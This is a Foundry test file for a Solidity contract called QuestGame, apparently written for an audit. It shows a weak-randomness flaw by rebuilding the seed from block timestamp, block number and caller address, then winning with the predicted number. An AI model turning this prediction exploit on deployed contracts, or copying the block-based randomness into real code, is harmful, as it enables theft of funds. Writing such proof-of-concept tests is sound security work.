
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;

    function setUp() public {
        // Deploy the contract with funds to pay out rewards
        questGame = new QuestGame{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        // Ensure timestamp is in the future relative to deployment
        vm.assume(blockTimestamp > block.timestamp);
        // Ensure block number is valid and greater than current
        vm.assume(blockNumber > block.number);
        
        // --- 2. State Configuration ---
        
        // Fund the test contract to pay the entry fee
        vm.deal(address(this), 1 ether);

        // Manipulate block environment to match the fuzzed values
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        // Replicate the vulnerable logic locally inside the test.
        // The contract uses block.timestamp, block.number, and msg.sender (which is address(this)).
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp, 
                    block.number, 
                    address(this) 
                )
            )
        );

        uint256 predictedNumber = seed % 100;

        // Execute the quest attempt with the predicted number
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        // Assert predictability by checking if we won (wins count increments)
        (, uint256 wins) = questGame.getPlayerStats(address(this));
        assertEq(wins, 1, "Randomness should be predictable given block state");
    }

    // Required to receive the reward ETH from the contract
    receive() external payable {}
}
